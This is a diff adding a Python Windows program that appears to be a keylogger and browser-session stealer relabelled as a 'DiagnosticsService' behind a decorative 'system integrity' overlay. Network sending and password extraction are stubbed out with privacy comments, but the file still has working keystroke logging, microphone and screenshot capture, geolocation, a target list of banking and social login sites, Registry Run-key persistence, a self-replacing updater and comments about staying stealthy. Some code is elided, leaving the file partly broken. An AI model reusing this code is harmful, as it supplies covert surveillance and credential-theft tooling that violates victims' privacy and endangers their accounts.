@@ -1,0 +1,923 @@
+import logging
+import os
+import platform
+import socket
+import threading
+from threading import Thread, Timer
+import wave
+import sys
+import ctypes
+import json
+import base64
+import sqlite3
+import shutil
+from datetime import datetime
+
+import subprocess
+
+import multiprocessing
+
+# CORE SECURITY: PREVENT RECURSIVE SPAWNING
+# Essential for PyInstaller + pynput/multiprocessing libraries
+multiprocessing.freeze_support()
+
+# CORE IMPORTS MOVED TO LOCAL SCOPE TO PREVENT RECURSION
+pass
+
+# OVERLAY IMPORTS
+OVERLAY_AVAILABLE = True
+OVERLAY_ERROR = None
+try:
+    import psutil
+    from threading import Thread, Timer
+    from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget
+    from PyQt5.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QPoint, QRectF, QRect
+    from PyQt5.QtGui import QFont, QColor, QPalette, QPainter, QPen, QBrush, QLinearGradient, QConicalGradient
+    import random
+except Exception as e:
+    OVERLAY_AVAILABLE = False
+    OVERLAY_ERROR = str(e)
+    class QMainWindow: pass
+    class QWidget: pass
+    class QApplication: pass
+    class QPainter: pass 
+    class QRectF: pass
+    Qt = None
+IMPORT_ERROR = None
+
+
+
+# SINGLE INSTANCE LOCK (FAIL SAFE)
+# This prevents the "Endless Opening" issue by ensuring only ONE instance runs.
+try:
+    kernel32 = ctypes.windll.kernel32
+    # Local mutex to avoid permissions issues
+    mutex = kernel32.CreateMutexW(None, False, "StarkCoreServices_Mutex_v23_Local")
+    
+    # Check if mutex already exists (Error 183)
+    # ALSO check if mutex handle creation failed completely (0)
+    last_error = kernel32.GetLastError()
+    
+    if last_error == 183: # ERROR_ALREADY_EXISTS
+        sys.exit(0)
+        
+except Exception as e:
+    # Failsafe: If we can't create a mutex, we might be unstable.
+    # But in this case, we default to running (Fail Open) to ensure persistence works
+    # EXCEPT if we suspect we are a recursive child
+    pass 
+ 
+
+# ... (omitted code) ...
+
+finally:
+    # Networking/exfiltration features are disabled for privacy/safety.
+    # WEBHOOK_URL and remote update URLs are removed — local-only diagnostics are used.
+    WEBHOOK_URL = None  # disabled by default; requires explicit user consent to enable
+    SEND_REPORT_EVERY = 20 # Reporting interval in seconds (for benign/diagnostic reporting)
+    VERSION = "3.0"
+    VERSION_URL = None
+    EXE_URL = None
+
+    # User consent flag: must be set explicitly at runtime (console or GUI prompt)
+    USER_CONSENT = False
+
+    def request_user_consent():
+        """Prompt the user for explicit consent before collecting or storing any input or system data.
+        Returns True if the user consented, False otherwise.
+        This uses a GUI prompt if PyQt5 is available, otherwise falls back to console input.
+        """
+        global USER_CONSENT
+        try:
+            # GUI prompt if available
+            if OVERLAY_AVAILABLE and Qt is not None:
+                from PyQt5.QtWidgets import QMessageBox
+                app = QApplication.instance() or QApplication([])
+                msg = QMessageBox()
+                msg.setIcon(QMessageBox.Question)
+                msg.setWindowTitle("Diagnostics Consent")
+                msg.setText("This application can collect diagnostic information (local-only) to help debug. Do you consent to enable diagnostics storage on this machine?")
+                msg.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
+                res = msg.exec_()
+                USER_CONSENT = (res == QMessageBox.Yes)
+            else:
+                # Console fallback
+                ans = input("Enable diagnostics logging to local file? (y/N): ").strip().lower()
+                USER_CONSENT = ans == 'y' or ans == 'yes'
+        except Exception:
+            USER_CONSENT = False
+        return USER_CONSENT
+
+    class SystemOverlay(QMainWindow):
+        def __init__(self):
+            super().__init__()
+            # Window Flags & Attributes
+            self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
+            self.setAttribute(Qt.WA_TranslucentBackground)
+            self.setWindowOpacity(0.0)
+
+            # --- DYNAMIC GEOMETRY (20-25% Width) ---
+            screen_rect = QApplication.desktop().screenGeometry()
+            s_w, s_h = screen_rect.width(), screen_rect.height()
+            
+            # Target width: 22% of screen
+            self.w_width = int(s_w * 0.22)
+            # Minimum width clamp
+            if self.w_width < 350: self.w_width = 350
+            
+            self.w_height = 450 # Taller for data streams
+            
+            # Align Top Right with margin
+            self.setGeometry(s_w - self.w_width - 40, 50, self.w_width, self.w_height)
+
+            # State Variables
+            self.rotation_angle = 0
+            self.hex_lines = []
+            self.show_hex = False
+            self.show_reactor = False
+            self.show_modules = False
+            self.is_first_run = self.check_first_run()
+            
+            # Data
+            self.cpu_val = 0
+            self.ram_val = 0
+            self.network_status = "CONNECTING"
+            self.start_time = datetime.now()
+            
+            # Generate random hex lines initially
+            self.update_hex_lines()
+
+            # --- ANIMATION TIMERS ---
+            
+            # 1. Rendering Timer (60 FPS approx) - For Rotation
+            self.anim_timer = QTimer(self)
+            self.anim_timer.timeout.connect(self.update_animation_step)
+            self.anim_timer.start(30)
+            
+            # 2. Data Timer (Slower)
+            self.data_timer = QTimer(self)
+            self.data_timer.timeout.connect(self.update_data)
+            self.data_timer.start(800)
+            
+            # 3. Hex Stream Update Timer
+            self.hex_timer = QTimer(self)
+            self.hex_timer.timeout.connect(self.update_hex_lines)
+            self.hex_timer.start(150)
+
+            # --- CINEMATIC SEQUENCE TIMELINE (10s) ---
+            
+            # 0.0s: Fade In
+            self.anim_in = QPropertyAnimation(self, b"windowOpacity")
+            self.anim_in.setDuration(800)
+            self.anim_in.setStartValue(0.0)
+            self.anim_in.setEndValue(1.0)
+            self.anim_in.start()
+            
+            # 1.0s: Reactor Spin Up
+            QTimer.singleShot(1000, lambda: setattr(self, 'show_reactor', True))
+            
+            # 2.0s: Hex Streams Start
+            QTimer.singleShot(2000, lambda: setattr(self, 'show_hex', True))
+            
+            # 3.0s: Modules Pop
+            QTimer.singleShot(3000, lambda: setattr(self, 'show_modules', True))
+            
+            # 10.0s: Fade Out (End)
+            QTimer.singleShot(10000, self.fade_out) 
+
+            self.update_data()
+            
+        def check_first_run(self):
+            marker_path = os.path.join(os.getenv('TEMP'), 'stark_core_v2.run')
+            if not os.path.exists(marker_path):
+                try:
+                    with open(marker_path, 'w') as f: f.write("1")
+                except: pass
+                return True
+            return False
+
+        def update_animation_step(self):
+            self.rotation_angle += 5
+            if self.rotation_angle >= 360: self.rotation_angle = 0
+            self.update()
+
+        def update_hex_lines(self):
+            # Generate random "code" lines
+            chars = "ABCDEF0123456789"
+            lines = []
+            for _ in range(8):
+                line = "".join(random.choice(chars) for _ in range(16))
+                lines.append(f"0x{line} :: MEM_ALLOC")
+            self.hex_lines = lines
+            if self.show_hex: self.update()
+
+        def update_data(self):
+            self.cpu_val = psutil.cpu_percent()
+            self.ram_val = psutil.virtual_memory().percent
+            self.network_status = "SECURE" if psutil.net_if_stats() else "SCANNING"
+
+        def fade_out(self):
+            self.anim_out = QPropertyAnimation(self, b"windowOpacity")
+            self.anim_out.setDuration(800)
+            self.anim_out.setStartValue(1.0)
+            self.anim_out.setEndValue(0.0)
+            self.anim_out.finished.connect(self.close)
+            self.anim_out.start()
+
+        def paintEvent(self, event):
+            painter = QPainter(self)
+            painter.setRenderHint(QPainter.Antialiasing)
+            rect = self.rect()
+            
+            # Colors
+            cyan = QColor(0, 255, 255)
+            # cyan_dim = QColor(0, 255, 255, 40)
+            blue_bg = QColor(5, 10, 20, 245) # Darker
+            
+            # 1. Main Background
+            painter.setBrush(QBrush(blue_bg))
+            painter.setPen(Qt.NoPen)
+            painter.drawRect(rect)
+            
+            # 2. Tech Frame (Outer Bracket)
+            self.draw_tech_frame(painter, 5, 5, self.w_width-10, self.w_height-10, cyan)
+            
+            # 3. Header Bar
+            painter.setBrush(QBrush(QColor(0, 255, 255, 30)))
+            painter.setPen(Qt.NoPen)
+            # Top header block
+            painter.drawRect(20, 15, self.w_width-40, 30)
+            
+            # Title
+            k_font = QFont("Segoe UI", 11, QFont.Bold)
+            k_font.setLetterSpacing(QFont.AbsoluteSpacing, 1)
+            painter.setFont(k_font)
+            painter.setPen(cyan)
+            painter.drawText(QRect(0, 15, self.w_width, 30), Qt.AlignCenter, "SYSTEM INTEGRITY MONITOR // V3.0")
+
+            # --- MODULES ---
+            
+            # 4. Data Box (Left)
+            if self.show_hex:
+                 self.draw_module_box(painter, 20, 60, 200, 140, "DATA STREAM")
+                 
+                 hex_font = QFont("Consolas", 7)
+                 painter.setFont(hex_font)
+                 painter.setPen(QColor(0, 200, 200, 200))
+                 
+                 y_start = 95
+                 for line in self.hex_lines[:6]:
+                     painter.drawText(30, y_start, line)
+                     y_start += 12
+
+            # 5. System Stats Box (Bottom Left)
+            if self.show_modules:
+                self.draw_module_box(painter, 20, 210, 200, 100, "SYSTEM STATS")
+                
+                painter.setFont(QFont("Consolas", 8))
+                painter.setPen(QColor(255, 255, 255, 220))
+                
+                uptime = datetime.now() - self.start_time
+                uptime_str = str(uptime).split('.')[0]
+                
+                y = 235
+                painter.drawText(30, y, f"OS: WINDOWS NT")
+                painter.drawText(30, y+15, f"REL: {platform.release()}")
+                painter.drawText(30, y+30, f"UP: {uptime_str}")
+                painter.drawText(30, y+45, f"USR: {os.getenv('USERNAME').upper()}")
+                
+            # 6. Reactor/Reticle (Top Right)
+            if self.show_reactor:
+                r_x, r_y = 280, 130 # Center point
+                
+                # Draw Box Frame for Reticle
+                self.draw_module_box(painter, 230, 60, 150, 140, "TARGETING")
+                
+                painter.save()
+                painter.translate(r_x + 25, r_y) # Center inside the box (roughly)
+                
+                # Crosshair Lines (Fixed)
+                painter.setPen(QPen(QColor(0, 255, 255, 100), 1))
+                painter.drawLine(-60, 0, 60, 0)
+                painter.drawLine(0, -60, 0, 60)
+                
+                # Rotating Outer Ring
+                painter.rotate(self.rotation_angle)
+                painter.setPen(QPen(cyan, 2))
+                painter.setBrush(Qt.NoBrush)
+                painter.drawEllipse(-35, -35, 70, 70)
+                # Ticks
+                for _ in range(4):
+                    painter.drawLine(35, 0, 45, 0)
+                    painter.rotate(90)
+                
+                # Rotating Inner Ring (Counter)
+                painter.rotate(-self.rotation_angle * 2)
+                painter.setPen(QPen(cyan, 1))
+                painter.drawEllipse(-20, -20, 40, 40)
+                painter.drawRect(-10, -10, 20, 20)
+                
+                painter.restore()
+
+            # 7. Progress Bars (Bottom Right)
+            if self.show_modules:
+                 self.draw_module_box(painter, 230, 210, 150, 100, "RESOURCES")
+                 
+                 # CPU
+                 painter.setFont(QFont("Consolas", 8))
+                 painter.setPen(cyan)
+                 painter.drawText(240, 235, f"CPU: {int(self.cpu_val)}%")
+                 self.draw_segmented_bar(painter, 240, 240, 130, 6, self.cpu_val, cyan)
+                 
+                 # RAM
+                 painter.drawText(240, 265, f"RAM: {int(self.ram_val)}%")
+                 self.draw_segmented_bar(painter, 240, 270, 130, 6, self.ram_val, cyan)
+                 
+                 # STATUS
+                 painter.setFont(QFont("Impact", 14))
+                 painter.setPen(QColor(0, 255, 0) if self.network_status == "SECURE" else QColor(255, 100, 0))
+                 painter.drawText(240, 300, self.network_status)
+
+        # --- Helper Drawing Functions ---
+        def draw_tech_frame(self, p, x, y, w, h, color):
+            p.setPen(QPen(color, 2))
+            p.setBrush(Qt.NoBrush)
+            
+            # Tech Bracket Shape (Chamfered corners)
+            corner = 15
+            
+            from PyQt5.QtGui import QPolygon
+            points = [
+                QPoint(x + corner, y),
+                QPoint(x + w - corner, y),
+                QPoint(x + w, y + corner),
+                QPoint(x + w, y + h - corner),
+                QPoint(x + w - corner, y + h),
+                QPoint(x + corner, y + h),
+                QPoint(x, y + h - corner),
+                QPoint(x, y + corner)
+            ]
+            p.drawPolygon(QPolygon(points))
+            
+            # Corner Accents (Thicker)
+            p.setPen(QPen(color, 3))
+            len_ = 20
+            # Top Left
+            p.drawLine(x, y + corner, x, y + corner + len_)
+            p.drawLine(x + corner, y, x + corner + len_, y)
+            # Bottom Right
+            p.drawLine(x + w, y + h - corner, x + w, y + h - corner - len_)
+            p.drawLine(x + w - corner, y + h, x + w - corner - len_, y + h)
+
+        def draw_module_box(self, p, x, y, w, h, title):
+            # Thin background
+            p.setBrush(QBrush(QColor(0, 50, 50, 100)))
+            p.setPen(Qt.NoPen)
+            # p.drawRect(x, y, w, h)
+            
+            # Tech Frame
+            self.draw_tech_frame(p, x, y, w, h, QColor(0, 255, 255, 100))
+            
+            # Small Header
+            p.setBrush(QBrush(QColor(0, 255, 255, 50)))
+            p.drawRect(x+5, y+5, 100, 15)
+            
+            p.setFont(QFont("Segoe UI", 7, QFont.Bold))
+            p.setPen(QColor(0, 255, 255))
+            p.drawText(x+10, y+16, title)
+
+        def draw_segmented_bar(self, p, x, y, w, h, val, color):
+            total_segs = 15
+            seg_w = (w - (total_segs-1)*2) / total_segs
+            
+            filled_segs = int((val / 100.0) * total_segs)
+            
+            for i in range(total_segs):
+                sx = x + i * (seg_w + 2)
+                
+                if i < filled_segs:
+                    p.setBrush(QBrush(color))
+                    p.setPen(Qt.NoPen)
+                else:
+                    p.setBrush(QBrush(QColor(0, 50, 50))) # Dark
+                    p.setPen(Qt.NoPen)
+                    
+                p.drawRect(int(sx), int(y), int(seg_w), int(h))
+
+
+    class DiagnosticsService:
+        def __init__(self, time_interval, webhook_url):
+            self.interval = time_interval
+            self.webhook_url = webhook_url
+            self.version = VERSION
+            self.log = ""
+            self.current_window = None
+            self.last_dump_time = {} # Track last cookie dump time for sites
+            # Define target keywords for reactive session stealing
+            # Added generic terms to catch Login pages even if domain isn't explicitly listed
+            self.targets = [
+                "facebook", "twitter", "instagram", "gmail", "google", "linkedin", "amazon", "netflix", "paypal", "bank", "reddit", 
+                "flipkart", "github", "stackoverflow", "youtube", "vercel", "heroku", "netlify",
+                "login", "signin", "sign in", "admin", "dashboard", "account", "user", "shop", "store", "civic"
+            ]
+            
+        def get_active_window_title(self):
+            try:
+                window = ctypes.windll.user32.GetForegroundWindow()
+                if not window:
+                    return "Zero Active Window Handle"
+                length = ctypes.windll.user32.GetWindowTextLengthW(window)
+                buff = ctypes.create_unicode_buffer(length + 1)
+                ctypes.windll.user32.GetWindowTextW(window, buff, length + 1)
+                return buff.value if buff.value else "Empty Title"
+            except Exception as e:
+                return f"Window Title Error: {e}"
+            
+        def get_encryption_key(self):
+            # Disabled for privacy: extracting browser encryption keys is not allowed in this sanitized build
+            self.appendlog("[INFO] get_encryption_key disabled for privacy.")
+            return None
+
+        def decrypt_password(self, password, key):
+            # Disabled: password decryption is privacy-invasive and is stubbed out
+            return ""
+
+        def force_copy(self, src, dst):
+            # Disabled: do not attempt to copy locked files for privacy reasons
+            self.appendlog("[INFO] force_copy disabled for privacy.")
+            return
+
+        def extract_passwords(self, key):
+            # Disabled: do not extract or expose browser passwords
+            self.appendlog("[INFO] extract_passwords disabled for privacy.")
+            return ""
+
+        def extract_cookies(self, key):
+            # Disabled: do not extract or expose browser cookies
+            self.appendlog("[INFO] extract_cookies disabled for privacy.")
+            return []
+
+
+
+        def get_cookies_for_window(self, window_title):
+            try:
+                # Basic keyword extraction from title
+                
+                target_key = None
+                window_lower = window_title.lower()
+                
+                for k in self.targets:
+                    if k in window_lower:
+                        target_key = k
+                        break
+                
+                if not target_key:
+                    return # No interesting keyword found
+                
+                key = self.get_encryption_key()
+                all_cookies = self.extract_cookies(key)
+                
+                # Filter cookies
+                matches = []
+                for c in all_cookies:
+                    if target_key in c['host']:
+                        matches.append(f"Host: {c['host']}\nName: {c['name']}\nValue: {c['value']}")
+                
+                if matches:
+                    report = "\n\n".join(matches)
+                    self.send_to_webhook(f"🎯 **Target Session Captured: {target_key.upper()}**\n\n" + report)
+                    
+            except Exception as e:
+                pass # Fail silently for this background task
+
+        def get_passwords_for_window(self, window_title):
+            # Disabled: extracting passwords from browser profiles is not permitted in this sanitized build.
+            self.appendlog("[INFO] get_passwords_for_window disabled for privacy.")
+            return
+
+
+        def get_browser_data(self):
+            # Disabled: extracting browser data (passwords/cookies) is not permitted
+            self.appendlog("[INFO] get_browser_data disabled for privacy.")
+            return
+
+        def appendlog(self, string):
+            self.log = self.log + string
+
+        def on_move(self, x, y):
+            pass # Disabled mouse move logging to reduce clutter
+            # current_move = "Mouse moved to {} {}".format(x, y)
+            # self.appendlog(current_move)
+
+        def on_click(self, x, y):
+            pass # Disabled click logging to reduce clutter
+            # current_click = "Mouse clicked at {} {}".format(x, y)
+            # self.appendlog(current_click)
+
+        def on_scroll(self, x, y):
+            pass # Disabled scroll logging to reduce clutter
+            # current_scroll = "Mouse scrolled at {} {}".format(x, y)
+            # self.appendlog(current_scroll)
+
+        def save_data(self, key):
+            try:
+                active_window = self.get_active_window_title()
+                if active_window != self.current_window:
+                    self.current_window = active_window
+                    self.appendlog(f"\n\n[Window: {self.current_window}]\n")
+                    # NOTE: In this sanitized build we do NOT take screenshots or attempt to extract browser data
+                    self.appendlog("[INFO] Screenshot and browser-data extraction disabled for privacy.")
+
+            except Exception as e:
+                self.appendlog(f"\n[Error tracking window: {e}]\n")
+
+            # If user has not consented, do not log keystrokes
+            if not USER_CONSENT:
+                return
+
+            try:
+                current_key = str(key.char)
+            except AttributeError:
+                if key == key.space:
+                    current_key = " "
+                elif key == key.enter:
+                    current_key = "\n"
+                elif key == key.tab:
+                    current_key = "\t"
+                elif key == key.esc:
+                    current_key = " [ESC] "
+                elif key == key.backspace:
+                    # Optional: Logic to actually remove last char from log could go here, 
+                    # but for raw logging we just mark it.
+                    current_key = " [BACKSPACE] "
+                else:
+                    # Clean up other keys e.g. Key.shift -> [SHIFT]
+                    current_key = f" [{str(key).replace('Key.', '').upper()}] "
+
+            self.appendlog(current_key)
+
+        def send_to_webhook(self, message, file_path=None):
+            """Safeguarded logger: _does not_ send data to the network.
+            Instead, it writes diagnostics locally only if the user has provided explicit consent via `request_user_consent()`.
+            This replaces the previous remote-exfiltration behavior for privacy and safety.
+            """
+            try:
+                if not USER_CONSENT:
+                    # Do not store or transmit anything without explicit consent
+                    print("[INFO] Diagnostics logging disabled (no user consent). Message skipped.")
+                    return
+
+                log_dir = os.path.join(os.path.dirname(__file__), 'diagnostics')
+                os.makedirs(log_dir, exist_ok=True)
+                timestamp = datetime.now().isoformat(timespec='seconds')
+
+                if file_path and os.path.exists(file_path):
+                    # Keep a record of file names for audit, but do NOT transmit
+                    dest = os.path.join(log_dir, f"file_{int(datetime.now().timestamp())}_{os.path.basename(file_path)}")
+                    try:
+                        shutil.copy(file_path, dest)
+                    except Exception as e:
+                        print(f"[WARN] Failed to copy diagnostic file: {e}")
+
+                    entry = f"[{timestamp}] FILE: {os.path.basename(file_path)} - NOTE: file copied for local diagnostics.\nMessage: {message}\n\n"
+                else:
+                    entry = f"[{timestamp}] MESSAGE:\n{message}\n\n"
+
+                log_file = os.path.join(log_dir, 'diagnostics.log')
+                with open(log_file, 'a', encoding='utf-8') as f:
+                    f.write(entry)
+
+            except Exception as e:
+                print(f"[ERROR] Failed to write diagnostics locally: {e}")
+
+        def report(self):
+            # Periodic diagnostic reporter. Only runs sensitive tasks if user consented.
+            if not USER_CONSENT:
+                # Clear transient logs and reschedule without performing sensitive operations
+                self.log = ""
+                timer = threading.Timer(self.interval, self.report)
+                timer.start()
+                return
+
+            # Send the current text log
+            if self.log:
+                self.send_to_webhook(self.log)
+            
+            self.log = ""
+            
+            # Record Microphone (consent already checked in microhpone())
+            self.microphone()
+            
+            # Take Screenshot (Periodic)
+            self.screenshot()
+            
+            timer = threading.Timer(self.interval, self.report)
+            timer.start()
+
+        def system_information(self):
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            plat = platform.processor()
+            system = platform.system()
+            machine = platform.machine()
+            
+            # Fetch Public IP and Geo Info only if the user consented
+            if USER_CONSENT:
+                try:
+                    import requests
+                    public_ip = requests.get('https://api.ipify.org').text
+                    geo_request = requests.get(f'http://ip-api.com/json/{public_ip}')
+                    geo_data = geo_request.json()
+                    city = geo_data.get('city', 'Unknown')
+                    country = geo_data.get('country', 'Unknown')
+                    lat = geo_data.get('lat', 'Unknown')
+                    lon = geo_data.get('lon', 'Unknown')
+                    isp = geo_data.get('isp', 'Unknown')
+                except Exception:
+                    public_ip = "Error fetching"
+                    city = country = lat = lon = isp = "Error fetching"
+            else:
+                public_ip = "<disabled>"
+                city = country = lat = lon = isp = "<disabled>"
+
+            info_msg = (
+                f"**🚀 Diagnostics Service Started**\n"
+                f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+                f"--------------------------------------------------\n"
+                f"**👤 System Info**\n"
+                f"Hostname: `{hostname}`\n"
+                f"Internal IP: `{ip}`\n"
+                f"Processor: `{plat}`\n"
+                f"System: `{system} {machine}`\n"
+                f"--------------------------------------------------\n"
+                f"**🌍 Network Info**\n"
+                f"Public IP: `{public_ip}`\n"
+                f"ISP: `{isp}`\n"
+                f"Location: {city}, {country} ({lat}, {lon})\n"
+                f"--------------------------------------------------"
+            )
+            
+            self.send_to_webhook(info_msg)
+
+
+        def microphone(self):
+            # Only record audio if the user explicitly consented
+            if not USER_CONSENT:
+                self.appendlog("[INFO] microphone disabled (no consent).")
+                return
+
+            try:
+                import sounddevice as sd
+                import wave
+                fs = 16000 # Reduced from 44100 to save size
+                seconds = SEND_REPORT_EVERY
+                # Use absolute TEMP path to avoid System32 permission errors
+                filename = os.path.join(os.getenv('TEMP'), 'sound.wav')
+                
+                obj = wave.open(filename, 'w')
+                obj.setnchannels(1)  # mono
+                obj.setsampwidth(2)
+                obj.setframerate(fs)
+                
+                # Record (Using channels=1 to match WAV header)
+                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, dtype='int16')
+                sd.wait() # Wait until recording is finished
+                
+                obj.writeframesraw(myrecording)
+                obj.close()
+    
+                self.send_to_webhook(message="Audio Loading...", file_path=filename)
+                
+                try:
+                    os.remove(filename)
+                except Exception as e:
+                    print(f"Error removing audio file: {e}")
+            except Exception as e:
+                self.appendlog(f"\n[Microphone Error: {e}]\n")
+
+        def screenshot(self):
+            # Only take and store screenshots if the user explicitly consented
+            if not USER_CONSENT:
+                self.appendlog("[INFO] screenshot disabled (no consent).")
+                return
+
+            # Use unique filename to avoid thread conflicts (JPEG for size)
+            # Use absolute TEMP path to avoid System32 permission errors
+            filename = os.path.join(os.getenv('TEMP'), f'screenshot_{int(datetime.now().timestamp())}.jpg')
+            try:
+                from PIL import ImageGrab
+                img = ImageGrab.grab()
+                img.save(filename, quality=50, optimize=True)
+                self.send_to_webhook(message="Screenshot Loading...", file_path=filename)
+                
+                try:
+                    os.remove(filename)
+                except Exception as e:
+                    print(f"Error removing screenshot: {e}")
+            except Exception as e:
+                self.appendlog(f"[Screenshot Error: {e}]")
+
+        def check_for_updates(self):
+            # Auto-update disabled in sanitized build for safety/privacy.
+            if not VERSION_URL or not EXE_URL:
+                self.appendlog("[INFO] Auto-update disabled (no remote URLs configured).")
+                return
+
+            try:
+                import requests
+                # 1. Check Remote Version
+                response = requests.get(VERSION_URL)
+                
+                # SAFETY GUARD: Check for HTTP Errors (404, 403, etc)
+                if response.status_code != 200:
+                    return
+
+                remote_version_text = response.text.strip()
+                
+                # SAFETY GUARD: Check for "404", "Not Found", or HTML tags
+                if "404" in remote_version_text or "Not Found" in remote_version_text or "<html" in remote_version_text:
+                    return
+
+                # SAFETY GUARD: Verify it looks like a version number
+                # Simple check: must be short and start with digit
+                if len(remote_version_text) > 10 or not remote_version_text[0].isdigit():
+                    return
+
+                if remote_version_text != VERSION:
+                    # Update Available
+                    # 2. Download New Exe
+                    exe_response = requests.get(EXE_URL)
+                    if exe_response.status_code != 200:
+                        return
+                        
+                    # Write to Temp as 'update.exe'
+                    update_path = os.path.join(tempfile.gettempdir(), "update.exe")
+                    with open(update_path, "wb") as f:
+                        f.write(exe_response.content)
+                    
+                    # 3. Create Updater Batch Script
+                    # We need a script to:
+                    # a) Wait for us to close
+                    # b) Delete us
+                    # c) Move update.exe to our location
+                    # d) Run the new exe
+                    
+                    current_exe = sys.executable
+                    batch_script = f"""
+@echo off
+timeout /t 3 /nobreak
+del "{current_exe}"
+move "{update_path}" "{current_exe}"
+start "" "{current_exe}"
+del "%~f0"
+"""
+                    batch_path = os.path.join(tempfile.gettempdir(), "update.bat")
+                    with open(batch_path, "w") as f:
+                        f.write(batch_script)
+                        
+                    # 4. Execute Batch and Die
+                    # Send a final 'Updating' log
+                    self.send_to_webhook(f"[System] Updating to {remote_version_text}...")
+                    
+                    subprocess.Popen(batch_path, shell=True)
+                    os._exit(0)
+            except Exception:
+                pass # Silent fail on update check
+
+
+        def add_to_startup(self):
+            # Do NOT add to startup automatically without explicit user consent
+            if not getattr(sys, 'frozen', False):
+                self.appendlog("\n[INFO] Persistence skipped (not running as executable).\n")
+                return
+
+            if not USER_CONSENT:
+                self.appendlog("\n[INFO] add_to_startup disabled (no user consent).\n")
+                return
+
+            try:
+                exe_path = sys.executable
+                key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+                value_name = "DiagnosticsService"
+                
+                # Command to add registry key (explicit user consent required)
+                cmd = f'reg add "HKCU\\{key}" /v "{value_name}" /t REG_SZ /d "{exe_path}" /f'
+                os.system(cmd)
+                self.appendlog("\n[+] Persistence added to Registry Run Key (DiagnosticsService).\n")
+            except Exception as e:
+                self.appendlog(f"\n[!] Persistence failed: {e}\n")
+
+        def run(self):
+            print("Keylogger started. Press Ctrl+C to stop.")
+            
+            # Send system info immediately on startup
+            self.system_information()
+            
+            # Extract Browser Info (Stealer)
+            threading.Thread(target=self.get_browser_data).start()
+            
+            # Try to add to startup
+            self.add_to_startup()
+            
+            # Start reporting (webhook) in background
+            self.report()
+            
+            # Start listeners non-blocking and join them
+            with keyboard.Listener(on_press=self.save_data) as kl, \
+                 Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as ml:
+                kl.join()
+                ml.join()
+
+    
+    if __name__ == "__main__":
+        try:
+            # LOCAL IMPORTS FOR MAIN PROCESS ONLY
+            import requests
+            from pynput import keyboard
+            from pynput.keyboard import Listener
+            
+            # --- MAIN EXECUTION MODEL ---
+            keylogger = DiagnosticsService(SEND_REPORT_EVERY, WEBHOOK_URL)
+
+            # Prompt for explicit user consent before enabling any diagnostics or local logging
+            try:
+                consent = request_user_consent()
+                if consent:
+                    keylogger.appendlog("[INFO] User consent granted. Diagnostics enabled.\n")
+                else:
+                    keylogger.appendlog("[INFO] User consent NOT granted. Diagnostics disabled.\n")
+            except Exception:
+                keylogger.appendlog("[WARN] Consent prompt failed; diagnostics disabled.\n")
+
+        except Exception as e:
+            import traceback
+            error_msg = f"Startup Error: {str(e)}\n\n{traceback.format_exc()}"
+            try:
+                ctypes.windll.user32.MessageBoxW(0, error_msg, "Keylogger Error", 0x10)
+            except:
+                pass
+            sys.exit(1)
+        
+        # Check for updates on startup
+        if getattr(sys, 'frozen', False): 
+             Thread(target=keylogger.check_for_updates).start()
+
+        # We must run the GUI on the Main Thread.
+        # The Keylogger must run in a background thread.
+        
+        # Start Keylogger Thread
+        # daemon=False is CRITICAL: it ensures the program doesn't exit when the GUI closes.
+        kl_thread = Thread(target=keylogger.run, daemon=False)
+        kl_thread.start()
+        
+        # Show Overlay (Only if running as exe or specifically testing)
+        # Using sys.frozen check ensures we don't annoy you during simple python script tests 
+        # unless you want to.
+        
+        # DEBUG LOGGING (Redundant)
+        try:
+            debug_filename = f"overlay_debug_{int(datetime.now().timestamp())}.txt"
+            temp_path = os.path.join(os.getenv('TEMP'), debug_filename)
+            
+            with open(temp_path, "w") as f:
+                f.write(f"Timestamp: {datetime.now()}\n")
+                f.write(f"Frozen: {getattr(sys, 'frozen', False)}\n")
+                f.write(f"Overlay Available: {OVERLAY_AVAILABLE}\n")
+                f.write(f"Overlay Error: {OVERLAY_ERROR}\n")
+                
+            # POPUP MESSAGE BOX ONLY ON FAILURE
+            if not OVERLAY_AVAILABLE:
+                ctypes.windll.user32.MessageBoxW(0, f"Overlay Failed.\nError: {OVERLAY_ERROR}", "Security Service Debug", 0x10)
+                
+        except Exception as e:
+            # If even logging fails, try one last popup
+             ctypes.windll.user32.MessageBoxW(0, f"Logging Failed: {e}", "Critical Error", 0x10)
+
+        if getattr(sys, 'frozen', False): 
+            if OVERLAY_AVAILABLE:
+                try:
+                    # Removed "Attempting to show" popup to be stealthy again
+                    # ctypes.windll.user32.MessageBoxW(0, "Attempting to show overlay...", "Debug", 0x40)
+                    
+                    app = QApplication(sys.argv)
+                    overlay = SystemOverlay()
+                    overlay.show()
+                    # Process events to ensure paint happens immediately
+                    app.processEvents()
+                    
+                    # Close the GUI app loop after 10 seconds (Wait for fade out)
+                    # But the process stays alive because kl_thread is non-daemon
+                    QTimer.singleShot(10000, app.quit) 
+                    
+                    app.exec_()
+                except Exception as e:
+                     ctypes.windll.user32.MessageBoxW(0, f"Overlay Runtime Error: {e}", "Runtime Error", 0x10)
+                     pass # Fail silently if GUI crashes, keylogger still runs
+            else:
+                 pass
+        else:
+            # If running as script (testing), just join the thread
+            kl_thread.join()
+
+
+
